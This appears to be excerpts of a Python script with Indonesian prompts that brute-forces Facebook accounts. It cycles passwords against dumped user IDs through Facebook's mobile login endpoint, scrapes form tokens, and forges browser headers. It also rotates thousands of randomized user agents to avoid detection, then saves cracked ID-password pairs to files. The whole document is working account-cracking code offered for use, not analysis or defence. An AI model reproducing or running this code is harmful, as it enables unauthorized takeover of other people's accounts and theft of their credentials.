...
def file():
    try:
        repositori = input("Masukkan nama repositori DUMP: ")
...
def crack2(idf,pwx,user_agent):
	...
	for pw in pwx:
		try:
			asu = ses.get(f"https://m.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&wtsid=rdr_0A5145gZKo0sXXFLW&refsrc=deprecated&locale2=id_ID&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(asu.text)).group(1),
    ...
    "Connection": "keep-alive",
    "Content-Length": f"{str(rr(300,500))}",
    "Cache-Control": "max-age=0",
    "dpr": f"{str(rr(2,4))}",
    "viewport-width": "980",
    "sec-ch-ua": f'"Not A(Brand";v="{str(rr(88,99))}", "Android WebView";v="{str(rr(100,121))}", "Chromium";v="{str(rr(100,122))}"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "Android",
    "sec-ch-ua-platform-version": "",
    "sec-ch-ua-model": "",
    ...
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": f"https://m.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&wtsid=rdr_0A5145gZKo0sXXFLW&refsrc=deprecated&locale2=id_ID&_rdr",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
			po = ses.post(f"https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': kue}, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}[{b}CHEKPOINT{x}]{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}\n {x}USER2 {k}{ua2}\n {x}USER3 {k}{ua3}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
...
for firman in range(10000):
	...
	firman = f"Mozilla/5.0 (Linux; Android {versi_android}; {model_bulid} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
	firzah = random.choice([firman])
	user.append(firzah)
	
#	rr = random.randint; rc = random.choice
#	cih = str(rc([f'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36']))
#	cih1 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
#	cih2 = str(rc([f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1853 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36"]))
#	cih3 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36"]))
#	cih4 = str(rc([f"Mozilla/5.0 (Linux; Android 8.1.0; LML713DL Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36"]))
#	cih5 = str(rc([f"Mozilla/5.0 (Linux; Android 8.0.0; Lenovo K520 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36"]))
#	cih6 = str(rc([f"Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"]))
#	cih7 = str(rc([f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"]))
#	cih8 = str(rc([f"Mozilla/5.0 (Linux; Android 10; Infinix X680F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36"]))
#	FIRMANJR = random.choice([cih,cih1,cih2,cih3,cih4,cih5,cih6,cih7,cih8])
#	user.append(FIRMANJR)
	
	rr = random.randint; rc = random.choice
	cih = str(rc([f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/122.0.2365.92']))
	cih1 = str(rc([f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"]))
	cih2 = str(rc([f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 HeyTapBrowser/45.10.5.4.1"]))
	cih3 = str(rc([f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"]))
	cih4 = str(rc([f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"]))
	cih5 = str(rc([f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15"]))
	cih6 = str(rc([f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/112.0.5615.136 Safari/534.24 XiaoMi/MiuiBrowser/14.1.1-gn"]))
#	cih7 = str(rc([f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"]))
#	cih8 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SM-N920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36"]))
	FIRMANJR = random.choice([cih,cih1,cih2,cih3,cih4,cih5,cih6])
	user3.append(FIRMANJR)
